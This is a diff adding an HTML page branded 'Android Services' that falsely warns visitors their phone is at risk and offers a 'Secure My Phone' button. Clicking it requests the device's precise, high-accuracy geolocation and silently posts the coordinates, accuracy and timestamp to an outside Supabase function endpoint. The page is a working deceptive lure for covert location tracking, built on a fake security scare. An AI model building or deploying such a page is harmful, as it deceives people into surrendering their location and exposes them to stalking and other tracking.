@@ -1,0 +1,98 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Share Your Location</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen font-sans">
+  <!-- Android-themed card -->
+  <div class="bg-white rounded-3xl shadow-xl p-6 w-full max-w-sm">
+    <!-- App bar style header -->
+    <div class="bg-green-600 rounded-2xl -mt-6 -mx-6 mb-6 p-4 text-white flex items-center justify-center">
+      <svg xmlns="http://www.w3.org/2000/svg" 
+           class="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" 
+              d="M12 11c0-3.866-3.134-7-7-7S-2 7.134-2 11s3.134 7 7 7c1.96 0 3.727-.804 5-2.1C10.273 17.196 12.04 18 14 18c3.866 0 7-3.134 7-7s-3.134-7-7-7c-1.96 0-3.727.804-5 2.1C8.273 6.804 6.506 6 4.546 6c-3.866 0-7 3.134-7 7z" />
+      </svg>
+      <h1 class="text-lg font-semibold tracking-wide">Android Services</h1>
+    </div>
+
+    <!-- Content -->
+    <p class="text-gray-700 text-center mb-6">
+      Your phone at risk <b>Click below  to secure your phone</b> and get assistance quickly.
+    </p>
+
+    <!-- Action Button -->
+    <button
+      id="shareLocationLink"
+      class="w-full bg-green-600 hover:bg-green-700 text-white font-medium py-3 px-4 rounded-xl transition flex items-center justify-center"
+    >
+      <svg xmlns="http://www.w3.org/2000/svg" 
+           class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" 
+              d="M17.657 16.657L13.414 12l4.243-4.243m-4.243 4.243L6 6m7.414 5.657L6 18" />
+      </svg>
+      Secure My Phone
+    </button>
+
+    <!-- Status output -->
+    <div id="status" class="mt-4 text-sm text-center text-gray-500"></div>
+  </div>
+
+  <script>
+    const button = document.getElementById('shareLocationLink');
+    const statusEl = document.getElementById('status');
+
+    button.addEventListener('click', async (e) => {
+      e.preventDefault();
+
+      if (!('geolocation' in navigator)) {
+        statusEl.textContent = 'Geolocation not supported on this device.';
+        return;
+      }
+
+      button.disabled = true;
+      button.textContent = 'Requesting location...';
+
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const payload = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy_m: pos.coords.accuracy,
+            timestamp: pos.timestamp,
+          };
+
+          try {
+            const res = await fetch('https://hvcxmdtqrmgvrobzlcrt.supabase.co/functions/v1/get-current-location', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(payload),
+            });
+
+            if (!res.ok) throw new Error('Server error');
+
+            statusEl.textContent = '✅ Location shared successfully!';
+            statusEl.className = "mt-4 text-sm text-green-600 text-center";
+          } catch (err) {
+            statusEl.textContent = '❌ Failed to send location.';
+            statusEl.className = "mt-4 text-sm text-red-600 text-center";
+          } finally {
+            button.disabled = false;
+            button.textContent = 'Share My Location';
+          }
+        },
+        (err) => {
+          statusEl.textContent = '❌ ' + err.message;
+          statusEl.className = "mt-4 text-sm text-red-600 text-center";
+          button.disabled = false;
+          button.textContent = 'Share My Location';
+        },
+        { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 }
+      );
+    });
+  </script>
+</body>
+</html>
